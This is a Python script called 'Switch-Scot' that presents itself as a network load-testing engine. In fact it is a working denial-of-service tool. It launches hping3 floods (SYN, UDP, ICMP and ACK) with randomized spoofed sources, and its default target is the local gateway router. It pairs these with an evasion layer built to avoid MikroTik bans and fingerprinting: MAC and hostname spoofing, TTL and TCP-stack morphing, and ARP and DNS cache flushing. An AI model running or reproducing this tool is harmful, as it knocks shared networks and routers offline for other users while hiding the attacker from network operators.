#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch-Scot ⚡
Universal Multi-Interface Network Resilience & Load Testing Engine
Equipped with Deep Fingerprint Purge & MikroTik Evasion Stack
Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
Developed by: Mohammed Yaqeen (Yemen - Sana'a) | محمد يقين مجمل الفايق
"""

import os
import sys
import re
import random
import signal
import subprocess
import argparse
import time
import socket
from urllib.parse import urlparse
from datetime import datetime

BANNER = r"""
   _____         _ _       _         ____             _   
  / ____|       (_) |     | |       / ____|          | |  
 | (_____      ___| |_ ___| |__ ___| (___   ___  ___ | |_ 
  \___ \ \ /\ / / | __/ __| '_ \_____\___ \ / __|/ _ \| __|
  ____) \ V  V /| | || (__| | | |    ____) | (__| (_) | |_ 
 |_____/ \_/\_/ |_|\__\___|_| |_|   |_____/ \___|\___/ \__|
                                                           ⚡ v4.5 Pro
 المطور: محمد يقين مجمل الفايق - صنعاء، اليمن 🇾🇪
 Author: Mohammed Yaqeen - Sana'a, Yemen 🇾🇪
"""

# Hardware Vendor OUI Pool for realistic MAC Spoofing
VENDOR_MAC_POOLS = {
    "apple":    ["00:1c:b3", "00:cd:fe", "14:10:9f", "28:cf:e9", "3c:22:fb", "70:3e:ac", "bc:d0:74", "f4:5c:89"],
    "samsung":  ["00:12:47", "00:26:37", "04:18:0f", "14:bb:6e", "34:be:00", "50:c8:e5", "8c:77:12", "cc:07:ab"],
    "google":   ["00:1a:11", "3c:5a:37", "54:60:09", "70:3a:cb", "94:eb:cd", "f4:03:04"],
    "xiaomi":   ["00:ec:0a", "18:59:36", "34:ce:00", "64:09:80", "78:02:f8", "8c:be:be"],
    "intel":    ["00:1b:21", "00:21:6a", "34:13:e8", "68:05:ca", "80:86:f2", "a4:4c:c8"]
}

DEVICE_HOST_POOL = [
    "iPhone-15-Pro-Max", "iPhone-14-Pro", "iPad-Pro-M2", "Galaxy-S24-Ultra", 
    "Galaxy-Tab-S9", "Pixel-8-Pro", "Xiaomi-14-Ultra", "MacBook-Pro-M3", 
    "Dell-XPS-15", "ThinkPad-X1-Carbon", "Smart-TV-LG-OLED", "Sony-Bravia-4K", 
    "PlayStation-5", "Surface-Laptop-5", "Workstation-X"
]

MESSAGES = {
    "ar": {
        "menu_title": "=== لوحة التحكم والتشغيل التفاعلي السريع ===",
        "detected_ifaces": "كروت الشبكة المكتشفة في جهازك:",
        "all_ifaces": "A - تشغيل كل الكروت معاً (وضع التيربو الخارق 🚀)",
        "select_iface": "اختر رقم كرت الشبكة [الافتراضي 1]: ",
        "selected_iface": "الكروت المختارة: ",
        "enter_target": "أدخل عنوان الهدف أو الرابط [الافتراضي {default}]: ",
        "target_ip": "عنوان الهدف: ",
        "extracted_port": "المنفذ المستخرج تلقائياً: ",
        "enter_port": "أدخل رقم المنفذ المطلوب [الافتراضي {default}]: ",
        "final_port": "المنفذ المعتمد: ",
        "modes_title": "أوضاع الفحص والتقييم المتاحة:",
        "mode_1": "1 - نمط TCP-SYN (استنزاف اتصالات الراوتر - الأقوى)",
        "mode_2": "2 - نمط UDP (ضغط الذاكرة المؤقتة للراوتر)",
        "mode_3": "3 - نمط ICMP (قياس سرعة استجابة وتأخير المعالج)",
        "mode_4": "4 - نمط TCP-ACK (فحص واختبار جدار الحماية)",
        "select_mode": "اختر رقم وضع الفحص [الافتراضي 1]: ",
        "selected_mode": "الوضع المعتمد: ",
        "stealth_title": "خيارات مسح البصمة وتجاوز حظر شبكات الميكروتك (Anti-Tracking):",
        "stealth_1": "1 - تمويه ذكي آمن (تعديل TTL + مسح ذاكرة ARP + تغيير اسم الجهاز + الحفاظ على الواي فاي)",
        "stealth_2": "2 - مسح وتزوير فيزيائي كامل (تغيير MAC + تدوير بصمة النواة TCP/TTL + مسح ARP و DNS)",
        "stealth_3": "3 - تخصيص يدوي كامل لاسم وهوية الجهاز",
        "select_stealth": "اختر سياسة مسح البصمة [1-3، الافتراضي 1]: ",
        "hostname_prompt": "أدخل اسم الجهاز المخصص ليظهر في الراوتر [اضغط Enter للاسم العشوائي]: ",
        "custom_host_set": "اسم الجهاز المعتمد: ",
        "random_host_set": "اسم الجهاز: تم التوليد العشوائي الذكي",
        "press_enter": "اضغط ENTER للبدء والانطلاق فوراً...",
        "engine_active": "⚡ محرك SWITCH-SCOT يعمل الآن بأقصى طاقة ⚡",
        "platform": "بيئة التشغيل: ",
        "interfaces": "كروت الشبكة: ",
        "hostname": "اسم الجهاز : ",
        "mode_info": "وضع الفحص : ",
        "press_ctrl_c": "\n[*] اضغط Ctrl+C في أي وقت لإيقاف العملية بأمان.\n",
        "running_status": "\r>> [جاري الضخ] الهدف: {target}:{port} | الكروت: [{ifaces}] | النمط: {mode} | الوقت: {elapsed} ",
        "stopped": "\n\n[+] تم إيقاف عملية الضخ بنجاح على جميع الكروت.",
        "root_error_termux": "\n[!] تنبيه: يلزم صلاحيات الروت. اكتب tsu أولاً ثم شغل الأداة.",
        "root_error_linux": "\n[!] تنبيه: يلزم صلاحيات الروت. شغل الأداة بأمر sudo switch-scot",
        "missing_tools": "\n[!] تنبيه: هناك أدوات مفقودة في نظامك: {tools}",
        "termux_install_hint": "[*] للتثبيت على تيرمكس: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
        "debian_install_hint": "[*] للتثبيت على دبيان أو كالي: sudo apt install -y hping3 macchanger iproute2",
        "arch_install_hint": "[*] للتثبيت على آرش لينكس: sudo pacman -S --noconfirm hping macchanger iproute2",
        "applying_stealth": "\n[*] جاري مسح البصمات وتطبيق التمويه الشامل لمكافحة الحظر...",
        "verifying_carrier": "[*] جاري التحقق من جاهزية كرت الشبكة ومسار التوجيه على {iface}...",
        "carrier_ready": "[+] كرت الشبكة {iface} متصل ومسار التوجيه إلى {target} جاهز.",
        "carrier_timeout": "[!] تنبيه: تم بدء الإرسال المباشر على {iface}."
    },
    "en": {
        "menu_title": "=== Switch-Scot Interactive Setup Menu ===",
        "detected_ifaces": "Detected Network Interfaces:",
        "all_ifaces": "A - Use ALL Interfaces Simultaneously (Turbo Mode 🚀)",
        "select_iface": "Select Interface [Default 1]: ",
        "selected_iface": "Selected Interfaces: ",
        "enter_target": "Target IP or URL [Default {default}]: ",
        "target_ip": "Target Host/IP: ",
        "extracted_port": "Extracted Port: ",
        "enter_port": "Target Port [Default {default}]: ",
        "final_port": "Final Port: ",
        "modes_title": "Available Evaluation Modes:",
        "mode_1": "1 - TCP-SYN (Connection Table Saturation - Strongest)",
        "mode_2": "2 - UDP (Stateless Buffer Stress)",
        "mode_3": "3 - ICMP (Control Plane Latency)",
        "mode_4": "4 - TCP-ACK (Stateful Firewall Inspection)",
        "select_mode": "Select Mode [Default 1]: ",
        "selected_mode": "Selected Mode: ",
        "stealth_title": "Fingerprint Purge & Anti-Tracking Policy (MikroTik Evasion):",
        "stealth_1": "1 - Smart Safe Stealth (Spoof TTL + Flush ARP + Random Hostname + Keep Wi-Fi Stable)",
        "stealth_2": "2 - Full Hardware & OS Purge (Rotate MAC + Morph TCP/TTL Stack + Flush ARP/DNS)",
        "stealth_3": "3 - Custom Manual Identity Configuration",
        "select_stealth": "Select Stealth Policy [1-3, Default 1]: ",
        "hostname_prompt": "Custom Device Hostname [Press Enter for Random]: ",
        "custom_host_set": "Custom Hostname: ",
        "random_host_set": "Hostname: Random Smart Device Generated",
        "press_enter": "Press [ENTER] to Launch Switch-Scot...",
        "engine_active": "⚡ SWITCH-SCOT MULTI-INTERFACE ENGINE ACTIVE ⚡",
        "platform": "Platform   : ",
        "interfaces": "Interfaces : ",
        "hostname": "Hostname   : ",
        "mode_info": "Mode/Target: ",
        "press_ctrl_c": "\n[*] Press Ctrl+C at any time to safely stop.\n",
        "running_status": "\r>> [RUNNING] Target: {target}:{port} | Active Cards: [{ifaces}] | Mode: {mode} | Elapsed: {elapsed} ",
        "stopped": "\n\n[+] Switch-Scot execution stopped on all interfaces.",
        "root_error_termux": "\n[!] Error: Root privileges required. Run with 'tsu'",
        "root_error_linux": "\n[!] Error: Root privileges required. Run with 'sudo switch-scot'",
        "missing_tools": "\n[!] Missing required system tools: {tools}",
        "termux_install_hint": "[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
        "debian_install_hint": "[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2",
        "arch_install_hint": "[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2",
        "applying_stealth": "\n[*] Purging fingerprints and applying full anti-tracking stealth layer...",
        "verifying_carrier": "[*] Verifying carrier link and route readiness on {iface}...",
        "carrier_ready": "[+] Interface {iface} connected. Route to {target} verified.",
        "carrier_timeout": "[!] Notice: Link timeout reached. Proceeding on {iface}."
    }
}

class SwitchScot:
    def __init__(self, target="10.0.0.1", port=80, interfaces=None, mode="tcp-syn", skip_mac=False, custom_hostname=None, lang="ar"):
        self.lang = lang if lang in MESSAGES else "ar"
        self.msg = MESSAGES[self.lang]
        
        parsed_target, parsed_port = self.parse_target(target, port)
        self.target = parsed_target
        self.port = parsed_port
        self.mode = mode
        self.skip_mac = skip_mac
        self.custom_hostname = custom_hostname
        self.is_termux = self.check_termux()
        
        if interfaces is None:
            self.interfaces = [self.detect_default_interface()]
        elif isinstance(interfaces, str):
            self.interfaces = [i.strip() for i in interfaces.split(",") if i.strip()]
        else:
            self.interfaces = list(interfaces)
            
        if not self.interfaces:
            self.interfaces = [self.detect_default_interface()]

        self.attack_processes = []
        self.start_time = None
        self.current_macs = {}
        self.current_hostname = "N/A"

    @staticmethod
    def parse_target(raw_input, default_port=80):
        if not raw_input:
            return "10.0.0.1", default_port or 80

        raw_input = str(raw_input).strip()
        target_port = default_port or 80

        if not raw_input.startswith(('http://', 'https://')):
            match = re.match(r'^([^/:]+):(\d+)(/.*)?$', raw_input)
            if match:
                host = match.group(1)
                target_port = int(match.group(2))
                return host, target_port
            test_url = 'http://' + raw_input
        else:
            test_url = raw_input

        try:
            parsed = urlparse(test_url)
            host = parsed.hostname or raw_input
            if parsed.port:
                target_port = parsed.port
            elif parsed.scheme == 'https':
                target_port = 443
            elif parsed.scheme == 'http':
                target_port = 80
            
            try:
                ip = socket.gethostbyname(host)
                return ip, target_port
            except Exception:
                return host, target_port
        except Exception:
            return raw_input, target_port

    @staticmethod
    def check_termux():
        return "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")

    def check_root(self):
        if os.geteuid() != 0:
            if self.is_termux:
                print(self.msg["root_error_termux"])
            else:
                print(self.msg["root_error_linux"])
            sys.exit(1)

    def check_dependencies(self):
        required_tools = ["hping3", "ip"]
        if not self.skip_mac:
            required_tools.append("macchanger")

        missing = []
        for tool in required_tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(self.msg["missing_tools"].format(tools=', '.join(missing)))
            if self.is_termux:
                print(self.msg["termux_install_hint"])
            elif os.path.exists("/etc/arch-release"):
                print(self.msg["arch_install_hint"])
            else:
                print(self.msg["debian_install_hint"])
            sys.exit(1)

    @staticmethod
    def get_available_interfaces():
        try:
            return [f for f in os.listdir('/sys/class/net') if f != 'lo']
        except Exception:
            return ["wlan0"]

    @staticmethod
    def detect_gateway():
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", out)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "10.0.0.1"

    def detect_default_interface(self):
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"dev\s+([^\s]+)", out)
            if match:
                return match.group(1)
        except Exception:
            pass

        ifaces = self.get_available_interfaces()
        return ifaces[0] if ifaces else "wlan0"

    def get_mac_address(self, iface):
        try:
            out = subprocess.check_output(["ip", "link", "show", iface], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
            return match.group(1) if match else "Unknown"
        except Exception:
            return "Unknown"

    def wait_for_carrier_and_route(self, iface, timeout=15):
        print(self.msg["verifying_carrier"].format(iface=iface))
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            carrier_ok = False
            carrier_file = f"/sys/class/net/{iface}/carrier"
            operstate_file = f"/sys/class/net/{iface}/operstate"

            if os.path.exists(carrier_file):
                try:
                    with open(carrier_file, "r") as f:
                        if f.read().strip() == "1":
                            carrier_ok = True
                except Exception:
                    pass
            elif os.path.exists(operstate_file):
                try:
                    with open(operstate_file, "r") as f:
                        if f.read().strip() in ["up", "unknown"]:
                            carrier_ok = True
                except Exception:
                    pass
            else:
                carrier_ok = True

            if carrier_ok:
                try:
                    res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
                    if res.returncode == 0:
                        print(self.msg["carrier_ready"].format(iface=iface, target=self.target))
                        return True
                except Exception:
                    pass

            time.sleep(1)

        print(self.msg["carrier_timeout"].format(iface=iface))
        return False

    def generate_vendor_mac(self):
        """Generates a realistic vendor-based MAC address (Apple, Samsung, Intel, Google, Xiaomi)."""
        vendor = random.choice(list(VENDOR_MAC_POOLS.keys()))
        oui = random.choice(VENDOR_MAC_POOLS[vendor])
        nic = ":".join(f"{random.randint(0, 255):02x}" for _ in range(3))
        return f"{oui}:{nic}"

    def randomize_identity(self):
        print(self.msg["applying_stealth"])
        
        # 1. Morph Kernel Fingerprint (TTL & TCP Stack Evasion against p0f and DPI)
        # Randomize Default TTL (Windows: 128, Linux/Android/iOS: 64, Cisco: 255)
        new_ttl = random.choice([64, 128, 64, 128, 128])
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)
        
        # Randomize TCP SYN Window scaling and Timestamps to morph TCP SYN Fingerprints
        tcp_timestamps = random.choice([0, 1])
        tcp_sack = random.choice([0, 1])
        subprocess.run(["sysctl", "-w", f"net.ipv4.tcp_timestamps={tcp_timestamps}"], capture_output=True)
        subprocess.run(["sysctl", "-w", f"net.ipv4.tcp_sack={tcp_sack}"], capture_output=True)

        # 2. Spoof Device Hostname (DHCP Option 12)
        if self.custom_hostname:
            new_host = self.custom_hostname.replace(" ", "-")
        else:
            new_host = f"{random.choice(DEVICE_HOST_POOL)}-{random.randint(100, 999)}"
            
        subprocess.run(["hostname", new_host], capture_output=True)
        self.current_hostname = new_host

        # 3. Randomize Physical Hardware MAC Address
        for iface in self.interfaces:
            if not self.skip_mac:
                new_mac = self.generate_vendor_mac()
                print(f"[*] Rotating MAC on {iface} to vendor spoof [{new_mac}]...")
                subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "address", new_mac], capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
                self.current_macs[iface] = self.get_mac_address(iface)
                self.wait_for_carrier_and_route(iface)
            else:
                self.current_macs[iface] = self.get_mac_address(iface)

        # 4. Flush ARP Neighbor Table & Gateway Cache (MikroTik MAC/IP Cache Evasion)
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
        
        # 5. Flush Local DNS Caches if available
        subprocess.run(["resolvectl", "flush-caches"], capture_output=True)

    def build_command_for_interface(self, iface):
        base_cmd = ["hping3", "--flood", "--rand-source", "-I", iface]
        
        if self.mode == "tcp-syn":
            return base_cmd + ["-p", str(self.port), "-S", self.target]
        elif self.mode == "udp":
            return base_cmd + ["--udp", "-p", str(self.port), self.target]
        elif self.mode == "icmp":
            return base_cmd + ["--icmp", self.target]
        elif self.mode == "tcp-ack":
            return base_cmd + ["-p", str(self.port), "-A", self.target]
        else:
            return base_cmd + ["-p", str(self.port), "-S", self.target]

    def start(self):
        self.check_root()
        self.check_dependencies()
        self.randomize_identity()

        print("\n" + "=" * 65)
        print(f" {self.msg['engine_active']}")
        print(f" {self.msg['platform']}{'Android (Termux)' if self.is_termux else 'Linux OS'}")
        ifaces_info = [f"{i} ({self.current_macs.get(i, 'N/A')})" for i in self.interfaces]
        print(f" {self.msg['interfaces']}{', '.join(ifaces_info)}")
        print(f" {self.msg['hostname']}{self.current_hostname}")
        print(f" {self.msg['mode_info']}{self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
        print("=" * 65)
        print(self.msg["press_ctrl_c"])

        self.start_time = datetime.now()
        try:
            for iface in self.interfaces:
                cmd = self.build_command_for_interface(iface)
                proc = subprocess.Popen(
                    cmd,
                    preexec_fn=os.setsid,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.attack_processes.append(proc)
            
            ifaces_str = ", ".join(self.interfaces)
            while True:
                elapsed = str(datetime.now() - self.start_time).split(".")[0]
                status_text = self.msg["running_status"].format(
                    target=self.target,
                    port=self.port,
                    ifaces=ifaces_str,
                    mode=self.mode.upper(),
                    elapsed=elapsed
                )
                sys.stdout.write(status_text)
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        for proc in self.attack_processes:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                pass
        print(self.msg["stopped"])
        sys.exit(0)

def run_interactive_menu():
    print(BANNER)
    
    print("=" * 65)
    print(" 1 - اللغة العربية 🇾🇪")
    print(" 2 - English 🏴‍☠️")
    print("=" * 65)
    lang_sel = input("اختر اللغة / Select Language [1-2, default 1]: ").strip()
    lang = "en" if lang_sel == "2" else "ar"
    msg = MESSAGES[lang]

    print("\n" + msg["menu_title"])
    print("-" * 65)

    # 1. Multi-Interface Selection
    ifaces = SwitchScot.get_available_interfaces()
    default_iface = ifaces[0] if ifaces else "wlan0"
    
    print(f"\n{msg['detected_ifaces']}")
    for idx, iface in enumerate(ifaces, start=1):
        tag = " (الافتراضي)" if idx == 1 and lang == "ar" else (" (Default)" if idx == 1 else "")
        print(f"  {idx} - {iface}{tag}")
    print(f"  {msg['all_ifaces']}")
    
    sel_iface = input(f"\n{msg['select_iface']}").strip().lower()
    
    chosen_ifaces = []
    if sel_iface in ["a", "all", "ش", "الكل"]:
        chosen_ifaces = ifaces
    elif sel_iface:
        parts = re.split(r'[, ]+', sel_iface)
        for p in parts:
            try:
                num = int(p)
                if 1 <= num <= len(ifaces):
                    chosen_ifaces.append(ifaces[num - 1])
            except ValueError:
                if p in ifaces:
                    chosen_ifaces.append(p)
        chosen_ifaces = list(dict.fromkeys(chosen_ifaces))
    
    if not chosen_ifaces:
        chosen_ifaces = [default_iface]
        
    print(f"{msg['selected_iface']}{', '.join(chosen_ifaces)}")

    # 2. Target IP or URL Selection
    detected_gw = SwitchScot.detect_gateway()
    target_input = input(f"\n{msg['enter_target'].format(default=detected_gw)}").strip()
    raw_target = target_input if target_input else detected_gw
    
    extracted_host, extracted_port = SwitchScot.parse_target(raw_target, default_port=80)
    print(f"{msg['target_ip']}{extracted_host}")
    if raw_target.startswith(('http://', 'https://')) or ":" in raw_target:
        print(f"{msg['extracted_port']}{extracted_port}")

    # 3. Port Selection
    port_input = input(f"\n{msg['enter_port'].format(default=extracted_port)}").strip()
    try:
        chosen_port = int(port_input) if port_input else extracted_port
    except ValueError:
        chosen_port = extracted_port
    print(f"{msg['final_port']}{chosen_port}")

    # 4. Mode Selection
    modes = [
        ("tcp-syn", msg["mode_1"]),
        ("udp",     msg["mode_2"]),
        ("icmp",    msg["mode_3"]),
        ("tcp-ack", msg["mode_4"])
    ]
    print(f"\n{msg['modes_title']}")
    for idx, (m_id, m_desc) in enumerate(modes, start=1):
        print(f"  {m_desc}")
    
    sel_mode = input(f"\n{msg['select_mode']}").strip()
    try:
        chosen_mode = modes[int(sel_mode) - 1][0] if sel_mode else "tcp-syn"
    except (ValueError, IndexError):
        chosen_mode = "tcp-syn"
    print(f"{msg['selected_mode']}{chosen_mode.upper()}")

    # 5. Fingerprint & Anti-Tracking Policy
    print(f"\n{msg['stealth_title']}")
    print(f"  {msg['stealth_1']}")
    print(f"  {msg['stealth_2']}")
    print(f"  {msg['stealth_3']}")
    stealth_choice = input(f"\n{msg['select_stealth']}").strip()
    
    skip_mac = True
    custom_host = None
    
    if stealth_choice == "2":
        skip_mac = False
        print(f"{msg['random_host_set']}")
    elif stealth_choice == "3":
        host_input = input(f"\n{msg['hostname_prompt']}").strip()
        custom_host = host_input if host_input else None
        mac_ask = input("تدوير الماك أدرس أيضاً؟ / Randomize MAC? [y/N]: ").strip().lower()
        skip_mac = False if mac_ask in ["y", "yes", "ن", "نعم"] else True
        if custom_host:
            print(f"{msg['custom_host_set']}{custom_host}")
    else:
        # Default Smart Stealth (Safe Wi-Fi)
        skip_mac = True
        print(f"{msg['random_host_set']}")

    # Launch Engine
    print("\n" + "=" * 65)
    input(msg["press_enter"])
    
    engine = SwitchScot(
        target=extracted_host,
        port=chosen_port,
        interfaces=chosen_ifaces,
        mode=chosen_mode,
        skip_mac=skip_mac,
        custom_hostname=custom_host,
        lang=lang
    )
    engine.start()

def main():
    if len(sys.argv) == 1:
        run_interactive_menu()
        return

    parser = argparse.ArgumentParser(
        description="Switch-Scot ⚡ Universal Multi-Interface Network Resilience & Load Testing Engine",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-t", "--target",
        default="10.0.0.1",
        help="Target IP address or Web URL (e.g. 192.168.8.1 or http://router.lan:8080/login.html)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=None,
        help="Target Port (Default: Auto-extracted from URL or 80)"
    )
    parser.add_argument(
        "-i", "--interfaces",
        nargs="+",
        default=None,
        help="Network interface(s) to bind (e.g. -i wlp4s0 wlp9s0f4u2 or 'all')"
    )
    parser.add_argument(
        "-H", "--hostname",
        default=None,
        help="Custom device name/hostname to appear on target (Default: Random smart device)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["tcp-syn", "udp", "icmp", "tcp-ack"],
        default="tcp-syn",
        help="Evaluation Mode:\n"
             "  tcp-syn  : TCP SYN Connection Load (Default)\n"
             "  udp      : UDP Stateless Buffer Stress\n"
             "  icmp     : ICMP Echo Control Plane Latency\n"
             "  tcp-ack  : TCP ACK Stateful Filter Inspection"
    )
    parser.add_argument(
        "--no-mac",
        action="store_true",
        help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
    )
    parser.add_argument(
        "--purge",
        action="store_true",
        help="Execute an immediate standalone identity & fingerprint purge (MAC, TTL, Hostname, ARP, DNS)"
    )
    parser.add_argument(
        "-l", "--lang",
        choices=["ar", "en"],
        default="ar",
        help="Display language: [ar] for Arabic (Default), [en] for English"
    )

    args = parser.parse_args()
    
    cli_ifaces = args.interfaces
    if cli_ifaces and len(cli_ifaces) == 1 and cli_ifaces[0].lower() in ["all", "a", "الكل"]:
        cli_ifaces = SwitchScot.get_available_interfaces()

    engine = SwitchScot(
        target=args.target,
        port=args.port,
        interfaces=cli_ifaces,
        mode=args.mode,
        skip_mac=args.no_mac,
        custom_hostname=args.hostname,
        lang=args.lang
    )

    if args.purge:
        engine.check_root()
        engine.randomize_identity()
        print("\n[+] Deep identity & fingerprint purge completed successfully.")
        sys.exit(0)

    engine.start()

if __name__ == "__main__":
    main()
